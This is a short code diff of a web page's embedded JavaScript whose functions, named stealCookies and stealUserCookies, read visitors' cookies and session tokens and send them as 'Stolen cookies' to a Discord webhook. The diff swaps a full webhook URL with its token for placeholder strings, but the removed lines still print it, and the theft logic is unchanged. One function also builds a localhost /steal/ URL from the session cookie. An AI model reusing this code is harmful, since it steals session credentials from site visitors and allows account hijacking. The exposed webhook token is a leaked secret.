@@ -14,7 +14,7 @@
     <script>
         function stealCookies() {
             var cookies = document.cookie;
-            var webhookUrl = 'https://discord.com/api/webhooks/1232355522368508045/hA00uXOaGmsZnLbOq2EFNc7Fl84u4sMwMdJ0e_WRZtKi-flBa-DwQWLVKoGo7YuHfKgC';
+            var webhookUrl = 'WebhookURL';
             var data = {
                 content: 'Stolen cookies: ' + cookies,
             };
@@ -35,7 +35,7 @@
         function stealUserCookies() {
             var sessionCookie = getCookie('session');
             if (sessionCookie) {
-                var webhookUrl = 'https://discord.com/api/webhooks/1232355522368508045/hA00uXOaGmsZnLbOq2EFNc7Fl84u4sMwMdJ0e_WRZtKi-flBa-DwQWLVKoGo7YuHfKgC';
+                var webhookUrl = 'WEbhookUrl';
                 var url = 'http://localhost:8081/steal/' + sessionCookie;
                 var data = {
                     content: 'Stolen cookies: ' + sessionCookie,
